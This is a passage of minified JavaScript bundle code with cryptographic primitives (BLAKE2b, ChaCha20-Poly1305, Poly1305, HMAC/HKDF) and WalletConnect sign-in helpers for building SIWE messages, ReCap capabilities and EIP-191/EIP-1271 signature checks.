Uint8Array(this.blockLen);a.set(i),this.update(a)}}get(){let{v0l:e,v0h:t,v1l:i,v1h:n,v2l:s,v2h:o,v3l:a,v3h:c,v4l:l,v4h:u,v5l:d,v5h:h,v6l:f,v6h:p,v7l:g,v7h:w}=this;return[e,t,i,n,s,o,a,c,l,u,d,h,f,p,g,w]}set(e,t,i,n,s,o,a,c,l,u,d,h,f,p,g,w){this.v0l=e|0,this.v0h=t|0,this.v1l=i|0,this.v1h=n|0,this.v2l=s|0,this.v2h=o|0,this.v3l=a|0,this.v3h=c|0,this.v4l=l|0,this.v4h=u|0,this.v5l=d|0,this.v5h=h|0,this.v6l=f|0,this.v6h=p|0,this.v7l=g|0,this.v7h=w|0}compress(e,t,i){this.get().forEach((c,l)=>gt[l]=c),gt.set(ps,16);let{h:n,l:s}=lre(BigInt(this.length));gt[24]=ps[8]^s,gt[25]=ps[9]^n,i&&(gt[28]=~gt[28],gt[29]=~gt[29]);let o=0;const a=lje;for(let c=0;c<12;c++)of(0,4,8,12,e,t+2*a[o++]),af(0,4,8,12,e,t+2*a[o++]),of(1,5,9,13,e,t+2*a[o++]),af(1,5,9,13,e,t+2*a[o++]),of(2,6,10,14,e,t+2*a[o++]),af(2,6,10,14,e,t+2*a[o++]),of(3,7,11,15,e,t+2*a[o++]),af(3,7,11,15,e,t+2*a[o++]),of(0,5,10,15,e,t+2*a[o++]),af(0,5,10,15,e,t+2*a[o++]),of(1,6,11,12,e,t+2*a[o++]),af(1,6,11,12,e,t+2*a[o++]),of(2,7,8,13,e,t+2*a[o++]),af(2,7,8,13,e,t+2*a[o++]),of(3,4,9,14,e,t+2*a[o++]),af(3,4,9,14,e,t+2*a[o++]);this.v0l^=gt[0]^gt[16],this.v0h^=gt[1]^gt[17],this.v1l^=gt[2]^gt[18],this.v1h^=gt[3]^gt[19],this.v2l^=gt[4]^gt[20],this.v2h^=gt[5]^gt[21],this.v3l^=gt[6]^gt[22],this.v3h^=gt[7]^gt[23],this.v4l^=gt[8]^gt[24],this.v4h^=gt[9]^gt[25],this.v5l^=gt[10]^gt[26],this.v5h^=gt[11]^gt[27],this.v6l^=gt[12]^gt[28],this.v6h^=gt[13]^gt[29],this.v7l^=gt[14]^gt[30],this.v7h^=gt[15]^gt[31],hl(gt)}destroy(){this.destroyed=!0,hl(this.buffer32),this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)}}const fje=UUe(r=>new hje(r)),pje="https://rpc.walletconnect.org/v1";function xre(r){const e=`Ethereum Signed Message:
${r.length}`,t=new TextEncoder().encode(e+r);return"0x"+Buffer.from(YUe(t)).toString("hex")}async function gje(r,e,t,i,n,s){switch(t.t){case"eip191":return await mje(r,e,t.s);case"eip1271":return await wje(r,e,t.s,i,n,s);default:throw new Error(`verifySignature failed: Attempted to verify CacaoSignature with unknown type: ${t.t}`)}}async function mje(r,e,t){return(await NDe({hash:xre(e),signature:t})).toLowerCase()===r.toLowerCase()}async function wje(r,e,t,i,n,s){const o=uw(i);if(!o.namespace||!o.reference)throw new Error(`isValidEip1271Signature failed: chainId must be in CAIP-2 format, received: ${i}`);try{const a="0x1626ba7e",c="0000000000000000000000000000000000000000000000000000000000000040",l=t.substring(2),u=(l.length/2).toString(16).padStart(64,"0"),d=(e.startsWith("0x")?e:xre(e)).substring(2),h=a+d+c+u+l,f=await fetch(`${s||pje}/?chainId=${i}&projectId=${n}`,{headers:{"Content-Type":"application/json"},method:"POST",body:JSON.stringify({id:bje(),jsonrpc:"2.0",method:"eth_call",params:[{to:r,data:h},"latest"]})}),{result:p}=await f.json();return p?p.slice(0,a.length).toLowerCase()===a.toLowerCase():!1}catch(a){return console.error("isValidEip1271Signature: ",a),!1}}function bje(){return Date.now()+Math.floor(Math.random()*1e3)}function vje(r){const e=atob(r),t=new Uint8Array(e.length);for(let o=0;o<e.length;o++)t[o]=e.charCodeAt(o);const i=t[0];if(i===0)throw new Error("No signatures found");const n=1+i*64;if(t.length<n)throw new Error("Transaction data too short for claimed signature count");if(t.length<100)throw new Error("Transaction too short");const s=Buffer.from(r,"base64").slice(1,65);return Np.encode(s)}function yje(r){const e=new Uint8Array(Buffer.from(r,"base64")),t=Array.from("TransactionData::").map(s=>s.charCodeAt(0)),i=new Uint8Array(t.length+e.length);i.set(t),i.set(e,t.length);const n=fje(i,{dkLen:32});return Np.encode(n)}function Gz(r){const e=new Uint8Array(GC(xje(r)));return Np.encode(e)}function xje(r){if(r instanceof Uint8Array)return r;if(Array.isArray(r))return new Uint8Array(r);if(typeof r=="object"&&r!=null&&r.data)return new Uint8Array(Object.values(r.data));if(typeof r=="object"&&r)return new Uint8Array(Object.values(r));throw new Error("getNearUint8ArrayFromBytes: Unexpected result type from bytes array")}function Zz(r){const e=Buffer.from(r,"base64"),t=ULe(e).txn;if(!t)throw new Error("Invalid signed transaction: missing 'txn' field");const i=PLe(t),n=Buffer.from("TX"),s=Buffer.concat([n,Buffer.from(i)]),o=cje(s);return KLe.encode(o).replace(/=+$/,"")}function iI(r){const e=[];let t=BigInt(r);for(;t>=BigInt(128);)e.push(Number(t&BigInt(127)|BigInt(128))),t>>=BigInt(7);return e.push(Number(t)),Buffer.from(e)}function Cje(r){const e=Buffer.from(r.signed.bodyBytes,"base64"),t=Buffer.from(r.signed.authInfoBytes,"base64"),i=Buffer.from(r.signature.signature,"base64"),n=[];n.push(Buffer.from([10])),n.push(iI(e.length)),n.push(e),n.push(Buffer.from([18])),n.push(iI(t.length)),n.push(t),n.push(Buffer.from([26])),n.push(iI(i.length)),n.push(i);const s=Buffer.concat(n),o=GC(s);return Buffer.from(o).toString("hex").toUpperCase()}var Eje=Object.defineProperty,_je=Object.defineProperties,Sje=Object.getOwnPropertyDescriptors,Yz=Object.getOwnPropertySymbols,Aje=Object.prototype.hasOwnProperty,Ije=Object.prototype.propertyIsEnumerable,Jz=(r,e,t)=>e in r?Eje(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Tje=(r,e)=>{for(var t in e||(e={}))Aje.call(e,t)&&Jz(r,t,e[t]);if(Yz)for(var t of Yz(e))Ije.call(e,t)&&Jz(r,t,e[t]);return r},kje=(r,e)=>_je(r,Sje(e));const Nje="did:pkh:",IO=r=>r?.split(":"),Pje=r=>{const e=r&&IO(r);if(e)return r.includes(Nje)?e[3]:e[1]},SN=r=>{const e=r&&IO(r);if(e)return e[2]+":"+e[3]},Y7=r=>{const e=r&&IO(r);if(e)return e.pop()};async function Qz(r){const{cacao:e,projectId:t}=r,{s:i,p:n}=e,s=Cre(n,n.iss),o=Y7(n.iss);return await gje(o,s,i,SN(n.iss),t)}const Cre=(r,e)=>{const t=`${r.domain} wants you to sign in with your Ethereum account:`,i=Y7(e);if(!r.aud&&!r.uri)throw new Error("Either `aud` or `uri` is required to construct the message");let n=r.statement||void 0;const s=`URI: ${r.aud||r.uri}`,o=`Version: ${r.version}`,a=`Chain ID: ${Pje(e)}`,c=`Nonce: ${r.nonce}`,l=`Issued At: ${r.iat}`,u=r.exp?`Expiration Time: ${r.exp}`:void 0,d=r.nbf?`Not Before: ${r.nbf}`:void 0,h=r.requestId?`Request ID: ${r.requestId}`:void 0,f=r.resources?`Resources:${r.resources.map(g=>`
- ${g}`).join("")}`:void 0,p=v9(r.resources);if(p){const g=Iy(p);n=jje(n,g)}return[t,i,"",n,"",s,o,a,c,l,u,d,h,f].filter(g=>g!=null).join(`
`)};function $je(r){return Buffer.from(JSON.stringify(r)).toString("base64")}function Rje(r){return JSON.parse(Buffer.from(r,"base64").toString("utf-8"))}function Ig(r){if(!r)throw new Error("No recap provided, value is undefined");if(!r.att)throw new Error("No `att` property found");const e=Object.keys(r.att);if(!(e!=null&&e.length))throw new Error("No resources found in `att` property");e.forEach(t=>{const i=r.att[t];if(Array.isArray(i))throw new Error(`Resource must be an object: ${t}`);if(typeof i!="object")throw new Error(`Resource must be an object: ${t}`);if(!Object.keys(i).length)throw new Error(`Resource object is empty: ${t}`);Object.keys(i).forEach(n=>{const s=i[n];if(!Array.isArray(s))throw new Error(`Ability limits ${n} must be an array of objects, found: ${s}`);if(!s.length)throw new Error(`Value of ${n} is empty array, must be an array with objects`);s.forEach(o=>{if(typeof o!="object")throw new Error(`Ability limits (${n}) must be an array of objects, found: ${o}`)})})})}function Oje(r,e,t,i={}){return t?.sort((n,s)=>n.localeCompare(s)),{att:{[r]:Bje(e,t,i)}}}function Bje(r,e,t={}){e=e?.sort((n,s)=>n.localeCompare(s));const i=e.map(n=>({[`${r}/${n}`]:[t]}));return Object.assign({},...i)}function Ere(r){return Ig(r),`urn:recap:${$je(r).replace(/=/g,"")}`}function Iy(r){const e=Rje(r.replace("urn:recap:",""));return Ig(e),e}function Mje(r,e,t){const i=Oje(r,e,t);return Ere(i)}function Dje(r){return r&&r.includes("urn:recap:")}function Lje(r,e){const t=Iy(r),i=Iy(e),n=Uje(t,i);return Ere(n)}function Uje(r,e){Ig(r),Ig(e);const t=Object.keys(r.att).concat(Object.keys(e.att)).sort((n,s)=>n.localeCompare(s)),i={att:{}};return t.forEach(n=>{var s,o;Object.keys(((s=r.att)==null?void 0:s[n])||{}).concat(Object.keys(((o=e.att)==null?void 0:o[n])||{})).sort((a,c)=>a.localeCompare(c)).forEach(a=>{var c,l;i.att[n]=kje(Tje({},i.att[n]),{[a]:((c=r.att[n])==null?void 0:c[a])||((l=e.att[n])==null?void 0:l[a])})})}),i}function jje(r="",e){Ig(e);const t="I further authorize the stated URI to perform the following actions on my behalf: ";if(r.includes(t))return r;const i=[];let n=0;Object.keys(e.att).forEach(a=>{const c=Object.keys(e.att[a]).map(d=>({ability:d.split("/")[0],action:d.split("/")[1]}));c.sort((d,h)=>d.action.localeCompare(h.action));const l={};c.forEach(d=>{l[d.ability]||(l[d.ability]=[]),l[d.ability].push(d.action)});const u=Object.keys(l).map(d=>(n++,`(${n}) '${d}': '${l[d].join("', '")}' for '${a}'.`));i.push(u.join(", ").replace(".,","."))});const s=i.join(" "),o=`${t}${s}`;return`${r?r+" ":""}${o}`}function Xz(r){var e;const t=Iy(r);Ig(t);const i=(e=t.att)==null?void 0:e.eip155;return i?Object.keys(i).map(n=>n.split("/")[1]):[]}function eW(r){const e=Iy(r);Ig(e);const t=[];return Object.values(e.att).forEach(i=>{Object.values(i).forEach(n=>{var s;(s=n?.[0])!=null&&s.chains&&t.push(n[0].chains)})}),[...new Set(t.flat())]}function v9(r){if(!r)return;const e=r?.[r.length-1];return Dje(e)?e:void 0}/*! noble-ciphers - MIT License (c) 2023 Paul Miller (paulmillr.com) */function _re(r){return r instanceof Uint8Array||ArrayBuffer.isView(r)&&r.constructor.name==="Uint8Array"}function AN(r){if(typeof r!="boolean")throw new Error(`boolean expected, not ${r}`)}function nI(r){if(!Number.isSafeInteger(r)||r<0)throw new Error("positive integer expected, got "+r)}function _a(r,...e){if(!_re(r))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(r.length))throw new Error("Uint8Array expected of length "+e+", got length="+r.length)}function tW(r,e=!0){if(r.destroyed)throw new Error("Hash instance has been destroyed");if(e&&r.finished)throw new Error("Hash#digest() has already been called")}function Fje(r,e){_a(r);const t=e.outputLen;if(r.length<t)throw new Error("digestInto() expects output buffer of length at least "+t)}function Vf(r){return new Uint32Array(r.buffer,r.byteOffset,Math.floor(r.byteLength/4))}function Yw(...r){for(let e=0;e<r.length;e++)r[e].fill(0)}function qje(r){return new DataView(r.buffer,r.byteOffset,r.byteLength)}const zje=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;function Wje(r){if(typeof r!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(r))}function IN(r){if(typeof r=="string")r=Wje(r);else if(_re(r))r=TN(r);else throw new Error("Uint8Array expected, got "+typeof r);return r}function Hje(r,e){if(e==null||typeof e!="object")throw new Error("options must be defined");return Object.assign(r,e)}function Vje(r,e){if(r.length!==e.length)return!1;let t=0;for(let i=0;i<r.length;i++)t|=r[i]^e[i];return t===0}const Kje=(r,e)=>{function t(i,...n){if(_a(i),!zje)throw new Error("Non little-endian hardware is not yet supported");if(r.nonceLength!==void 0){const l=n[0];if(!l)throw new Error("nonce / iv required");r.varSizeNonce?_a(l):_a(l,r.nonceLength)}const s=r.tagLength;s&&n[1]!==void 0&&_a(n[1]);const o=e(i,...n),a=(l,u)=>{if(u!==void 0){if(l!==2)throw new Error("cipher output not supported");_a(u)}};let c=!1;return{encrypt(l,u){if(c)throw new Error("cannot encrypt() twice with same key + nonce");return c=!0,_a(l),a(o.encrypt.length,u),o.encrypt(l,u)},decrypt(l,u){if(_a(l),s&&l.length<s)throw new Error("invalid ciphertext length: smaller than tagLength="+s);return a(o.decrypt.length,u),o.decrypt(l,u)}}}return Object.assign(t,r),t};function rW(r,e,t=!0){if(e===void 0)return new Uint8Array(r);if(e.length!==r)throw new Error("invalid output length, expected "+r+", got: "+e.length);if(t&&!Zje(e))throw new Error("invalid output, must be aligned");return e}function iW(r,e,t,i){if(typeof r.setBigUint64=="function")return r.setBigUint64(e,t,i);const n=BigInt(32),s=BigInt(4294967295),o=Number(t>>n&s),a=Number(t&s);r.setUint32(e+4,o,i),r.setUint32(e+0,a,i)}function Gje(r,e,t){AN(t);const i=new Uint8Array(16),n=qje(i);return iW(n,0,BigInt(e),t),iW(n,8,BigInt(r),t),i}function Zje(r){return r.byteOffset%4===0}function TN(r){return Uint8Array.from(r)}const Sre=r=>Uint8Array.from(r.split("").map(e=>e.charCodeAt(0))),Yje=Sre("expand 16-byte k"),Jje=Sre("expand 32-byte k"),Qje=Vf(Yje),Xje=Vf(Jje);function hi(r,e){return r<<e|r>>>32-e}function kN(r){return r.byteOffset%4===0}const h8=64,eFe=16,Are=2**32-1,nW=new Uint32Array;function tFe(r,e,t,i,n,s,o,a){const c=n.length,l=new Uint8Array(h8),u=Vf(l),d=kN(n)&&kN(s),h=d?Vf(n):nW,f=d?Vf(s):nW;for(let p=0;p<c;o++){if(r(e,t,i,u,o,a),o>=Are)throw new Error("arx: counter overflow");const g=Math.min(h8,c-p);if(d&&g===h8){const w=p/4;if(p%4!==0)throw new Error("arx: invalid block position");for(let m=0,x;m<eFe;m++)x=w+m,f[x]=h[x]^u[m];p+=h8;continue}for(let w=0,m;w<g;w++)m=p+w,s[m]=n[m]^l[w];p+=g}}function rFe(r,e){const{allowShortKeys:t,extendNonceFn:i,counterLength:n,counterRight:s,rounds:o}=Hje({allowShortKeys:!1,counterLength:8,counterRight:!1,rounds:20},e);if(typeof r!="function")throw new Error("core must be a function");return nI(n),nI(o),AN(s),AN(t),(a,c,l,u,d=0)=>{_a(a),_a(c),_a(l);const h=l.length;if(u===void 0&&(u=new Uint8Array(h)),_a(u),nI(d),d<0||d>=Are)throw new Error("arx: counter overflow");if(u.length<h)throw new Error(`arx: output (${u.length}) is shorter than data (${h})`);const f=[];let p=a.length,g,w;if(p===32)f.push(g=TN(a)),w=Xje;else if(p===16&&t)g=new Uint8Array(32),g.set(a),g.set(a,16),w=Qje,f.push(g);else throw new Error(`arx: invalid 32-byte key, got length=${p}`);kN(c)||f.push(c=TN(c));const m=Vf(g);if(i){if(c.length!==24)throw new Error("arx: extended nonce must be 24 bytes");i(w,m,Vf(c.subarray(0,16)),m),c=c.subarray(16)}const x=16-n;if(x!==c.length)throw new Error(`arx: nonce must be ${x} or 16 bytes`);if(x!==12){const T=new Uint8Array(12);T.set(c,s?0:12-c.length),c=T,f.push(c)}const S=Vf(c);return tFe(r,w,m,S,l,u,d,o),Yw(...f),u}}const Ys=(r,e)=>r[e++]&255|(r[e++]&255)<<8;class iFe{constructor(e){this.blockLen=16,this.outputLen=16,this.buffer=new Uint8Array(16),this.r=new Uint16Array(10),this.h=new Uint16Array(10),this.pad=new Uint16Array(8),this.pos=0,this.finished=!1,e=IN(e),_a(e,32);const t=Ys(e,0),i=Ys(e,2),n=Ys(e,4),s=Ys(e,6),o=Ys(e,8),a=Ys(e,10),c=Ys(e,12),l=Ys(e,14);this.r[0]=t&8191,this.r[1]=(t>>>13|i<<3)&8191,this.r[2]=(i>>>10|n<<6)&7939,this.r[3]=(n>>>7|s<<9)&8191,this.r[4]=(s>>>4|o<<12)&255,this.r[5]=o>>>1&8190,this.r[6]=(o>>>14|a<<2)&8191,this.r[7]=(a>>>11|c<<5)&8065,this.r[8]=(c>>>8|l<<8)&8191,this.r[9]=l>>>5&127;for(let u=0;u<8;u++)this.pad[u]=Ys(e,16+2*u)}process(e,t,i=!1){const n=i?0:2048,{h:s,r:o}=this,a=o[0],c=o[1],l=o[2],u=o[3],d=o[4],h=o[5],f=o[6],p=o[7],g=o[8],w=o[9],m=Ys(e,t+0),x=Ys(e,t+2),S=Ys(e,t+4),T=Ys(e,t+6),k=Ys(e,t+8),I=Ys(e,t+10),E=Ys(e,t+12),C=Ys(e,t+14);let N=s[0]+(m&8191),L=s[1]+((m>>>13|x<<3)&8191),$=s[2]+((x>>>10|S<<6)&8191),y=s[3]+((S>>>7|T<<9)&8191),A=s[4]+((T>>>4|k<<12)&8191),b=s[5]+(k>>>1&8191),v=s[6]+((k>>>14|I<<2)&8191),_=s[7]+((I>>>11|E<<5)&8191),O=s[8]+((E>>>8|C<<8)&8191),D=s[9]+(C>>>5|n),R=0,P=R+N*a+L*(5*w)+$*(5*g)+y*(5*p)+A*(5*f);R=P>>>13,P&=8191,P+=b*(5*h)+v*(5*d)+_*(5*u)+O*(5*l)+D*(5*c),R+=P>>>13,P&=8191;let B=R+N*c+L*a+$*(5*w)+y*(5*g)+A*(5*p);R=B>>>13,B&=8191,B+=b*(5*f)+v*(5*h)+_*(5*d)+O*(5*u)+D*(5*l),R+=B>>>13,B&=8191;let M=R+N*l+L*c+$*a+y*(5*w)+A*(5*g);R=M>>>13,M&=8191,M+=b*(5*p)+v*(5*f)+_*(5*h)+O*(5*d)+D*(5*u),R+=M>>>13,M&=8191;let W=R+N*u+L*l+$*c+y*a+A*(5*w);R=W>>>13,W&=8191,W+=b*(5*g)+v*(5*p)+_*(5*f)+O*(5*h)+D*(5*d),R+=W>>>13,W&=8191;let K=R+N*d+L*u+$*l+y*c+A*a;R=K>>>13,K&=8191,K+=b*(5*w)+v*(5*g)+_*(5*p)+O*(5*f)+D*(5*h),R+=K>>>13,K&=8191;let q=R+N*h+L*d+$*u+y*l+A*c;R=q>>>13,q&=8191,q+=b*a+v*(5*w)+_*(5*g)+O*(5*p)+D*(5*f),R+=q>>>13,q&=8191;let J=R+N*f+L*h+$*d+y*u+A*l;R=J>>>13,J&=8191,J+=b*c+v*a+_*(5*w)+O*(5*g)+D*(5*p),R+=J>>>13,J&=8191;let le=R+N*p+L*f+$*h+y*d+A*u;R=le>>>13,le&=8191,le+=b*l+v*c+_*a+O*(5*w)+D*(5*g),R+=le>>>13,le&=8191;let ae=R+N*g+L*p+$*f+y*h+A*d;R=ae>>>13,ae&=8191,ae+=b*u+v*l+_*c+O*a+D*(5*w),R+=ae>>>13,ae&=8191;let U=R+N*w+L*g+$*p+y*f+A*h;R=U>>>13,U&=8191,U+=b*d+v*u+_*l+O*c+D*a,R+=U>>>13,U&=8191,R=(R<<2)+R|0,R=R+P|0,P=R&8191,R=R>>>13,B+=R,s[0]=P,s[1]=B,s[2]=M,s[3]=W,s[4]=K,s[5]=q,s[6]=J,s[7]=le,s[8]=ae,s[9]=U}finalize(){const{h:e,pad:t}=this,i=new Uint16Array(10);let n=e[1]>>>13;e[1]&=8191;for(let a=2;a<10;a++)e[a]+=n,n=e[a]>>>13,e[a]&=8191;e[0]+=n*5,n=e[0]>>>13,e[0]&=8191,e[1]+=n,n=e[1]>>>13,e[1]&=8191,e[2]+=n,i[0]=e[0]+5,n=i[0]>>>13,i[0]&=8191;for(let a=1;a<10;a++)i[a]=e[a]+n,n=i[a]>>>13,i[a]&=8191;i[9]-=8192;let s=(n^1)-1;for(let a=0;a<10;a++)i[a]&=s;s=~s;for(let a=0;a<10;a++)e[a]=e[a]&s|i[a];e[0]=(e[0]|e[1]<<13)&65535,e[1]=(e[1]>>>3|e[2]<<10)&65535,e[2]=(e[2]>>>6|e[3]<<7)&65535,e[3]=(e[3]>>>9|e[4]<<4)&65535,e[4]=(e[4]>>>12|e[5]<<1|e[6]<<14)&65535,e[5]=(e[6]>>>2|e[7]<<11)&65535,e[6]=(e[7]>>>5|e[8]<<8)&65535,e[7]=(e[8]>>>8|e[9]<<5)&65535;let o=e[0]+t[0];e[0]=o&65535;for(let a=1;a<8;a++)o=(e[a]+t[a]|0)+(o>>>16)|0,e[a]=o&65535;Yw(i)}update(e){tW(this),e=IN(e),_a(e);const{buffer:t,blockLen:i}=this,n=e.length;for(let s=0;s<n;){const o=Math.min(i-this.pos,n-s);if(o===i){for(;i<=n-s;s+=i)this.process(e,s);continue}t.set(e.subarray(s,s+o),this.pos),this.pos+=o,s+=o,this.pos===i&&(this.process(t,0,!1),this.pos=0)}return this}destroy(){Yw(this.h,this.r,this.buffer,this.pad)}digestInto(e){tW(this),Fje(e,this),this.finished=!0;const{buffer:t,h:i}=this;let{pos:n}=this;if(n){for(t[n++]=1;n<16;n++)t[n]=0;this.process(t,0,!0)}this.finalize();let s=0;for(let o=0;o<8;o++)e[s++]=i[o]>>>0,e[s++]=i[o]>>>8;return e}digest(){const{buffer:e,outputLen:t}=this;this.digestInto(e);const i=e.slice(0,t);return this.destroy(),i}}function nFe(r){const e=(i,n)=>r(n).update(IN(i)).digest(),t=r(new Uint8Array(32));return e.outputLen=t.outputLen,e.blockLen=t.blockLen,e.create=i=>r(i),e}const sFe=nFe(r=>new iFe(r));function oFe(r,e,t,i,n,s=20){let o=r[0],a=r[1],c=r[2],l=r[3],u=e[0],d=e[1],h=e[2],f=e[3],p=e[4],g=e[5],w=e[6],m=e[7],x=n,S=t[0],T=t[1],k=t[2],I=o,E=a,C=c,N=l,L=u,$=d,y=h,A=f,b=p,v=g,_=w,O=m,D=x,R=S,P=T,B=k;for(let W=0;W<s;W+=2)I=I+L|0,D=hi(D^I,16),b=b+D|0,L=hi(L^b,12),I=I+L|0,D=hi(D^I,8),b=b+D|0,L=hi(L^b,7),E=E+$|0,R=hi(R^E,16),v=v+R|0,$=hi($^v,12),E=E+$|0,R=hi(R^E,8),v=v+R|0,$=hi($^v,7),C=C+y|0,P=hi(P^C,16),_=_+P|0,y=hi(y^_,12),C=C+y|0,P=hi(P^C,8),_=_+P|0,y=hi(y^_,7),N=N+A|0,B=hi(B^N,16),O=O+B|0,A=hi(A^O,12),N=N+A|0,B=hi(B^N,8),O=O+B|0,A=hi(A^O,7),I=I+$|0,B=hi(B^I,16),_=_+B|0,$=hi($^_,12),I=I+$|0,B=hi(B^I,8),_=_+B|0,$=hi($^_,7),E=E+y|0,D=hi(D^E,16),O=O+D|0,y=hi(y^O,12),E=E+y|0,D=hi(D^E,8),O=O+D|0,y=hi(y^O,7),C=C+A|0,R=hi(R^C,16),b=b+R|0,A=hi(A^b,12),C=C+A|0,R=hi(R^C,8),b=b+R|0,A=hi(A^b,7),N=N+L|0,P=hi(P^N,16),v=v+P|0,L=hi(L^v,12),N=N+L|0,P=hi(P^N,8),v=v+P|0,L=hi(L^v,7);let M=0;i[M++]=o+I|0,i[M++]=a+E|0,i[M++]=c+C|0,i[M++]=l+N|0,i[M++]=u+L|0,i[M++]=d+$|0,i[M++]=h+y|0,i[M++]=f+A|0,i[M++]=p+b|0,i[M++]=g+v|0,i[M++]=w+_|0,i[M++]=m+O|0,i[M++]=x+D|0,i[M++]=S+R|0,i[M++]=T+P|0,i[M++]=k+B|0}const aFe=rFe(oFe,{counterRight:!1,counterLength:4,allowShortKeys:!1}),cFe=new Uint8Array(16),sW=(r,e)=>{r.update(e);const t=e.length%16;t&&r.update(cFe.subarray(t))},lFe=new Uint8Array(32);function oW(r,e,t,i,n){const s=r(e,t,lFe),o=sFe.create(s);n&&sW(o,n),sW(o,i);const a=Gje(i.length,n?n.length:0,!0);o.update(a);const c=o.digest();return Yw(s,a),c}const uFe=r=>(e,t,i)=>({encrypt(n,s){const o=n.length;s=rW(o+16,s,!1),s.set(n);const a=s.subarray(0,-16);r(e,t,a,a,1);const c=oW(r,e,t,a,i);return s.set(c,o),Yw(c),s},decrypt(n,s){s=rW(n.length-16,s,!1);const o=n.subarray(0,-16),a=n.subarray(-16),c=oW(r,e,t,o,i);if(!Vje(a,c))throw new Error("invalid tag");return s.set(n.subarray(0,-16)),r(e,t,s,s,1),Yw(c),s}}),Ire=Kje({blockSize:64,nonceLength:12,tagLength:16},uFe(aFe));let Tre=class extends KC{constructor(e,t){super(),this.finished=!1,this.destroyed=!1,EO(e);const i=fu(t);if(this.iHash=e.create(),typeof this.iHash.update!="function")throw new Error("Expected instance of class which extends utils.Hash");this.blockLen=this.iHash.blockLen,this.outputLen=this.iHash.outputLen;const n=this.blockLen,s=new Uint8Array(n);s.set(i.length>n?e.create().update(i).digest():i);for(let o=0;o<s.length;o++)s[o]^=54;this.iHash.update(s),this.oHash=e.create();for(let o=0;o<s.length;o++)s[o]^=106;this.oHash.update(s),hl(s)}update(e){return vp(this),this.iHash.update(e),this}digestInto(e){vp(this),dl(e,this.outputLen),this.finished=!0,this.iHash.digestInto(e),this.oHash.update(e),this.oHash.digestInto(e),this.destroy()}digest(){const e=new Uint8Array(this.oHash.outputLen);return this.digestInto(e),e}_cloneInto(e){e||(e=Object.create(Object.getPrototypeOf(this),{}));const{oHash:t,iHash:i,finished:n,destroyed:s,blockLen:o,outputLen:a}=this;return e=e,e.finished=n,e.destroyed=s,e.blockLen=o,e.outputLen=a,e.oHash=t._cloneInto(e.oHash),e.iHash=i._cloneInto(e.iHash),e}clone(){return this._cloneInto()}destroy(){this.destroyed=!0,this.oHash.destroy(),this.iHash.destroy()}};const ZC=(r,e,t)=>new Tre(r,e).update(t).digest();ZC.create=(r,e)=>new Tre(r,e);function dFe(r,e,t){return EO(r),t===void 0&&(t=new Uint8Array(r.outputLen)),ZC(r,fu(t),fu(e))}const sI=Uint8Array.from([0]),aW=Uint8Array.of();function hFe(r,e,t,i=32){EO(r),y0(i);const n=r.outputLen;if(i>255*n)throw new Error("Length should be <= 255*HashLen");const s=Math.ceil(i/n);t===void 0&&(t=aW);const o=new Uint8Array(s*n),a=ZC.create(r,e),c=a._cloneInto(),l=new Uint8Array(a.outputLen);for(let u=0;u<s;u++)sI[0]=u+1,c.update(u===0?aW:l).update(t).update(sI).digestInto(l),o.set(l,n*u),a._cloneInto(c);return a.destroy(),c.destroy(),hl(l,sI),o.slice(0,i)}const fFe=(r,e,t,i,n)=>hFe(r,dFe(r,e,t),i,n),YC=GC,TO=BigInt(0),NN=BigInt(1);function J7(r,e){if(typeof e!="boolean")throw new Error(r+" boolean expected, got "+e)}function f8(r){const e=r.toString(16);return e.length&1?"0"+e:e}function kre(r){if(typeof r!="string")throw new Error("hex string expected, got "+typeof r);return r===""?TO:BigInt("0x"+r)}function JC(r){return kre(Ay(r))}function Q7(r){return dl(r),kre(Ay(Uint8Array.from(r).reverse()))}function kO(r,e){return SO(r.toString(16).padStart(e*2,"0"))}function NO(r,e){return kO(r,e).reverse()}function va(r,e,t){let i;if(typeof e=="string")try{i=SO(e)}catch(s){throw new Error(r+" must be hex string or Uint8Array, cause: "+s)}else if(CO(e))i=Uint8Array.from(e);else throw new Error(r+" must be hex string or Uint8Array");const n=i.length;if(typeof t=="number"&&n!==t)throw new Error(r+" of length "+t+" expected, got "+n);return i}const oI=r=>typeof r=="bigint"&&TO<=r;function pFe(r,e,t){return oI(r)&&oI(e)&&oI(t)&&e<=r&&r<t}function PN(r,e,t,i){if(!pFe(e,t,i))throw new Error("expected valid "+r+": "+t+" <= n < "+i+", got "+e)}function gFe(r){let e;for(e=0;r>TO;r>>=NN,e+=1);return e}const QC=r=>(NN<<BigInt(r))-NN;function mFe(r,e,t){if(typeof r!="number"||r<2)throw new Error("hashLen must be a number");if(typeof e!="number"||e<2)throw new Error("qByteLen must be a number");if(typeof t!="function")throw new Error("hmacFn must be a function");const i=h=>new Uint8Array(h),n=h=>Uint8Array.of(h);let s=i(r),o=i(r),a=0;const c=()=>{s.fill(1),o.fill(0),a=0},l=(...h)=>t(o,s,...h),u=(h=i(0))=>{o=l(n(0),h),s=l(),h.length!==0&&(o=l(n(1),h),s=l())},d=()=>{if(a++>=1e3)throw new Error("drbg: tried 1000 values");let h=0;const f=[];for(;h<e;){s=l();const p=s.slice();f.push(p),h+=s.length}return A1(...f)};return(h,f)=>{c(),u(h);let p;for(;!(p=f(d()));)u();return c(),p}}function XC(r,e,t={}){if(!r||typeof r!="object")throw new Error("expected valid options object");function i(n,s,o){const a=r[n];if(o&&a===void 0)return;const c=typeof a;if(c!==s||a===null)throw new Error(`param "${n}" is invalid: expected ${s}, got ${c}`)}Object.entries(e).forEach(([n,s])=>i(n,s,!1)),Object.entries(t).forEach(([n,s])=>i(n,s,!0))}function cW(r){const e=new WeakMap;return(t,...i)=>{const n=e.get(t);if(n!==void 0)return n;const s=r(t,...i);return e.set(t,s),s}}const Na=BigInt(0),Go=BigInt(1),I1=BigInt(2),wFe=BigInt(3),Nre=BigInt(4),Pre=BigInt(5),$re=BigInt(8);function Qc(r,e){const t=r%e;return t>=Na?t:e+t}function Ql(r,e,t){let i=r;for(;e-- >Na;)i*=i,i%=t;return i}function lW(r,e){if(r===Na)throw new Error("invert: expected non-zero number");if(e<=Na)throw new Error("invert: expected positive modulus, got "+e);let t=Qc(r,e),i=e,n=Na,s=Go;for(;t!==Na;){const o=i/t,a=i%t,c=n-s*o;i=t,t=a,n=s,s=c}if(i!==Go)throw new Error("invert: does not exist");return Qc(n,e)}function Rre(r,e){const 